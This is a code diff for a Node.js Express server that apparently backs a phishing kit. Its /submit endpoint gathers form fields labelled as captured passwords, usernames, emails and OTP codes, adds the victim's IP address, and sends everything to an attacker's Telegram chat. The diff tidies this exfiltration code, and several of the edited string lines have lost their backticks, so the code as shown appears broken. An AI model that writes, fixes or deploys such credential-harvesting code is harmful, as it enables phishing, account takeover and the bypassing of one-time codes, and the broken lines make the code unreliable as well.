@@ -12,31 +12,23 @@ const CHAT_ID = process.env.CHAT_ID; // This will be your Group ID
 app.post('/submit', async (req, res) => {
     const data = req.body;
     
-    // Use backticks (the key below Esc) to wrap the message
+    // Using backticks ensures emojis don't break the code
     let message = 🔥 **PREMIUM CAPTURE** 🔥\n;
     message += ━━━━━━━━━━━━━━━━━━\n;
-    message += 🌐 **PORTAL:** \`${data.page || 'Direct Access'}\ \n\n`;
+    message += 🌐 **PORTAL:** ${data.page || 'Direct Access'} \n\n;
 
-    // Loops through all inputs
     for (const [key, value] of Object.entries(data)) {
         if (key !== 'page') {
-            let icon = '🔹';
-            const k = key.toLowerCase();
-            if (k.includes('pass')) icon = '🔑';
-            if (k.includes('user') || k.includes('email')) icon = '👤';
-            if (k.includes('otp') || k.includes('code')) icon = '🔢';
-            
-            message += ${icon} **${key.toUpperCase()}:** \`${value}\ \n`;
+            message += 🔹 **${key.toUpperCase()}:** ${value} \n;
         }
     }
 
     message += ━━━━━━━━━━━━━━━━━━\n;
-    message += 📍 **IP:** ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\n;
-    message += ⏰ **TIME:** ${new Date().toLocaleString('en-GB', { timeZone: 'UTC' })} UTC;
+    message += 📍 **IP:** ${req.headers['x-forwarded-for'] || req.socket.remoteAddress};
 
     try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
+        await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+            chat_id: process.env.CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
@@ -46,6 +38,5 @@ app.post('/submit', async (req, res) => {
         res.status(500).json({ status: "error" });
     }
 });
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Premium Bot System Live on ${PORT}`));
